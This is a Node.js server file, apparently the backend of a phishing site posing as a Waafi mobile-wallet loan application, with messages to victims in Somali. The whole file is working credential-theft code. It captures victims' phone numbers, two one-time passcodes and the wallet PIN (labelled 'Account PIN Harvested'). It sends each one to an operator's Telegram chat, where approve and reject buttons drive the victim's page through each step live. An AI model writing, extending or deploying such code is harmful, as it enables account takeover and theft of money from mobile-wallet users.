require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("❌ [ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
}

// 1. Setup Express and HTTP Server for Render Port Binding
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// Expose io globally so the bot callback listener can access it
global.io = io;

// Serve your frontend static files
app.use(express.static(path.join(__dirname, 'public'))); 
app.use(express.json());

// 2. Initialize Telegram Bot with Polling turned ON for easy cloud hosting stability
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
}

function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;
    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '' && key !== 'appId') {
                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
            }
        });
    } else if (data) {
        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
    }

    const message = `
📱 *Waafi Application: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *${escapeMarkdown(stepTitle)}*
━━━━━━━━━━━━━━━━━━━━━━━━
${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
Status: *State Log Processed*
    `.trim();

    const options = { parse_mode: 'Markdown' };

    if (requireInlineButtons) {
        options.reply_markup = {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP 1", callback_data: `approve_otp:${appId}` },
                { text: "❌ REJECT OTP 1", callback_data: `reject_otp:${appId}` }
            ]]
        };
    } else if (stepTitle.includes("Initial Request")) {
        options.reply_markup = {
            inline_keyboard: [[
                { text: "✅ APPROVE INITIAL PHONE", callback_data: `approve_initial:${appId}` },
                { text: "❌ REJECT INITIAL PHONE", callback_data: `admin_reject:${appId}` }
            ]]
        };
    }

    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error(err.message));
}

function sendFinalApproval(appId, pinCode) {
    if (!CHAT_ID) return;
    const message = `
💳 *Account PIN Harvested for ID: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *Step 2: Wallet Account Security PIN*
━━━━━━━━━━━━━━━━━━━━━━━━
• *Target Account PIN:* \`${escapeMarkdown(pinCode)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Verification Action*
    `.trim();

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE PIN", callback_data: `approve_pin:${appId}` },
                { text: "❌ REJECT PIN", callback_data: `reject_pin:${appId}` }
            ]]
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error(err.message));
}

function sendSecondOTP(appId, otp2Value) {
    if (!CHAT_ID) return;
    const message = `
🔑 *Second OTP (Step 3) for ID: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *Step 3: Secondary Multi-Factor Code*
━━━━━━━━━━━━━━━━━━━━━━━━
• *Target OTP 2 Code:* \`${escapeMarkdown(otp2Value)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Route Authorization*
    `.trim();

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP 2", callback_data: `approve_otp2:${appId}` },
                { text: "❌ REJECT OTP 2", callback_data: `reject_otp2:${appId}` }
            ]]
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error(err.message));
}

// Telegram Callback Processor
bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    if (!actionData) return;
    
    const [actionSignal, targetAppId] = actionData.split(':');
    let auditLogExecutionState = '';
    
    if (actionSignal === 'approve_initial') {
        io.to(targetAppId).emit('otp1-requested-success');
        auditLogExecutionState = "✅ Initial submission processed. Frontend opened to OTP 1 input entry block.";
    } else if (actionSignal === 'approve_otp') {
        io.to(targetAppId).emit('admin-approve-otp');
        auditLogExecutionState = "✅ OTP 1 verified. Frontend shifted to Step 2 (PIN) mode.";
    } else if (actionSignal === 'reject_otp') {
        io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
        auditLogExecutionState = "❌ OTP 1 signature flagged invalid.";
    } else if (actionSignal === 'approve_pin') {
        io.to(targetAppId).emit('pin-verified');
        auditLogExecutionState = "✅ PIN verified. Frontend shifted to Step 3 (OTP 2) mode.";
    } else if (actionSignal === 'reject_pin') {
        io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
        auditLogExecutionState = "❌ Wallet security PIN matched incorrect code.";
    } else if (actionSignal === 'approve_otp2') {
        io.to(targetAppId).emit('admin-approve-otp2');
        auditLogExecutionState = "✅ OTP 2 authorized.";
    } else if (actionSignal === 'reject_otp2') {
        io.to(targetAppId).emit('otp2-failed', { message: "Koodhka xaqiijinta labaad ee aad gelisay waa khalad." });
        auditLogExecutionState = "❌ Second OTP flagged invalid.";
    } else if (actionSignal === 'admin_reject') {
        io.to(targetAppId).emit('admin-reject', { message: "Xaqiijinta waa laga diaday" });
        auditLogExecutionState = "❌ Session rejected completely.";
    }

    try {
        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${auditLogExecutionState}_`, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
    }
});

// 3. Complete Socket.io Core Flow Routing Engines
io.on('connection', (socket) => {
    const appId = 'WAAFI-' + Math.random().toString(36).substring(2, 9).toUpperCase();
    
    // Send immediate unique session configuration to client
    socket.emit('session-ready', { appId });

    socket.on('join-room', (roomAppId) => {
        socket.join(roomAppId);
        console.log(`🔌 Client connected and joined session room: ${roomAppId}`);
    });

    socket.on('request-otp1', (data) => {
        sendToAdmin(data.appId, "Initial Request: Phone Submitted", { Phone: data.phone });
    });

    socket.on('step4-otp', (data) => {
        sendToAdmin(data.appId, "Verification Layer: OTP 1 Entry Received", { Phone: data.phone, "OTP Code 1": data.otp }, true);
    });

    // Capture front-end pin submission actions
    socket.on('step5-pin', (data) => {
        sendFinalApproval(data.appId, data.pin);
    });

    socket.on('submit-otp2', (data) => {
        sendSecondOTP(data.appId, data.otp2);
    });

    socket.on('submit-loan-details', (data) => {
        sendToAdmin(data.appId, "Loan Core Parameter Application Profiles", data);
        socket.emit('application-complete', { referenceId: 'REF-' + Math.floor(100000 + Math.random() * 900000) });
    });
});

// Start listening safely on Render's specified port environment
server.listen(PORT, () => {
    console.log(`🚀 Server successfully operating on port ${PORT}`);
});